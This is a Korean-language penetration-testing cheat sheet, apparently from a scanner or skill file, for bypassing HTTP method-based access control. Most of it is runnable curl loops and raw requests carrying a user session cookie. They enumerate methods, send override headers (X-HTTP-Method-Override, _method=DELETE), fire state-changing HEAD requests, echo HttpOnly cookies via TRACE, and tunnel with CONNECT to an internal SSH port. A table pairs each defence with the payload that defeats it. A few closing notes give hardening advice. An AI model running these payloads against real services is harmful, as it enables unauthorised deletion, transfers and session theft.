### 기본 페이로드

**Method enumeration (어떤 method 허용되는지):**
```bash
for m in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
  curl -X $m "https://target/admin/users" -H "Cookie: session=USER" -v 2>&1 | grep "^< HTTP"
done

# OPTIONS로 허용 method 확인
curl -X OPTIONS "https://target/api/resource" -v 2>&1 | grep -i "Allow:"
```

**Method override** (`OVERRIDE_BYPASS` 라벨):
- `X-HTTP-Method-Override: DELETE` (POST에 헤더 추가)
- `X-Method-Override: PUT`
- `X-HTTP-Method: DELETE`
- `_method=DELETE` (form body — Rails Rack::MethodOverride 기본 활성)
- `?_method=DELETE` (query string)

**HEAD/OPTIONS 우회** (`HEAD_BYPASS` 라벨):
```
# HEAD는 GET 핸들러 호출 — GET에 상태 변경 로직 있으면 트리거
HEAD /api/transfer?to=attacker&amount=100  Cookie: session=USER

# OPTIONS preflight 핸들러가 인증 우회 패턴
OPTIONS /api/admin/secret  Cookie: session=USER
```

**TRACE (Cross-Site Tracing):**
```bash
curl -X TRACE "https://target/" -v
# 200 + Content-Type: message/http + 요청 echo (HttpOnly 쿠키 노출)
```

**WebDAV/특수 method:**
```bash
for m in PROPFIND COPY MOVE LOCK UNLOCK MKCOL DELETE; do
  curl -X $m "https://target/files/x" -H "Depth: 1" -v
done
```

**CONNECT (프록시 터널):**
```
CONNECT internal.local:22 HTTP/1.1
Host: target
```

**Spring `@RequestMapping` (method 미지정) 우회:**
- `TRACE`, `OPTIONS`, `HEAD` 같은 비표준 method 시도 (Spring Security가 GET만 보호하면 우회)

**HTTP/2 `:method`:**
```bash
curl --http2 "https://target/admin" -X PATCH
```

**Case sensitivity:**
- `get` (소문자)
- `Get` (Mixed)
- `GET` (대문자)
- 일부 파서가 case-sensitive 검증 시 차이

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| GET/POST만 화이트리스트 | HEAD (GET 핸들러), TRACE (구버전 서버), OPTIONS (CORS preflight 핸들러) |
| method-override 비활성화 | 프레임워크 기본 활성 (Rails) 잔존 가능 — 호출 시도 |
| 인증 후 method-override 적용 | GET 인증 통과 → override로 DELETE — 인증 미들웨어 순서 의존 |
| Spring `.antMatchers("/x", POST)` 단일 method | GET/PUT/DELETE 누락 — 다른 method 호출 |
| gateway 특정 method만 허용 | gateway-backend 처리 차이 — HTTP smuggling 결합 |
| Case-sensitive method 검증 | `get`/`Get`/`GET` 변형 — 대소문자 혼합 |
| HTTP/1.1 method 검증 | HTTP/2 `:method` pseudo-header 다른 값 — `--http2 -X PATCH` |
| Method override 헤더 일부만 차단 | `X-HTTP-Method-Override` 차단 → `X-Method-Override`/`X-HTTP-Method` 시도 |

**검증 테스트:**
```bash
# 모든 method × 모든 override 헤더 조합
for m in PUT DELETE PATCH; do
  for h in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
    curl -X POST "https://target/api/resource" -H "$h: $m" -H "Cookie: session=USER" -v
  done
done

# _method form 필드
curl -X POST "https://target/api/resource" -d "_method=DELETE&id=1" -H "Cookie: session=USER" -v
```

---

### 참고사항

- Express `app.all` vs `app.get` 혼용이 가장 흔한 패턴
- Spring `@RequestMapping("/path")` (method 미지정)은 모든 HTTP method 허용 — 보안 설정도 method 미지정해야 일치
- Next.js API route의 `req.method` 분기 누락은 GET/POST/PUT/DELETE 모두 동일 핸들러 호출
- Rails `Rack::MethodOverride`는 기본 활성 — `_method=DELETE` 폼 필드로 우회 게이트
- nginx `limit_except` / Apache `<LimitExcept>` 설정은 화이트리스트 적용 후에도 백엔드 미일치 시 우회
- TRACE는 대부분 차단되어 있으나 잔존 환경에선 HttpOnly 쿠키 echo로 XSS+Cookie 탈취
- WebDAV는 활성화 잔존 시 의도치 않게 파일 수정/생성/이동
- gateway가 특정 method만 통과시켜도 backend가 모두 처리하면 우회 — http-smuggling 결합 점검
- HEAD는 RFC상 GET과 동일 핸들러 호출 (응답 본문만 생략) — GET에 상태 변경 로직 있으면 직접 트리거
- OPTIONS preflight 핸들러가 인증 미들웨어 우회되는 패턴 — CORS 설정 점검
- Method override는 form-friendly하지만 위험 — 비활성화 권장
- HTTP/2 `:method` pseudo-header는 HTTP/1.1 변환 시 다른 값 가능 — gateway 환경 점검
- Kubernetes API의 PATCH는 strategic merge patch — 의도와 다른 객체 수정 가능
- ASP.NET MVC route 정의에서 method 미명시 시 모든 method 허용
- 동일 라우트에 method별 다른 핸들러 등록은 가장 위험 — 권한 체크 누락 빈번
